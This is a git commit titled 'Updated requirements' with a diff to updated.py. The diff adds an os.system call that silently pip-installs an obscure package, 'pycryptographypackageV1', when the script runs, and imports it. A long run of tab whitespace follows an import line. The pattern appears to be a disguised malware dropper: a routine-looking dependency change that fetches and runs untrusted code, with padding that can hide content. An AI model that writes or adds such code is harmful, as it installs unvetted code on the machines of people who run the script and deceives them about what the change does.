fa288b91c6f68993d12bac39344df237371a1034
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-18 08:21:11 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingadds")
-import pythonfontingadds
+os.system("pip install pycryptographypackageV1")
+import pycryptographypackageV1
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
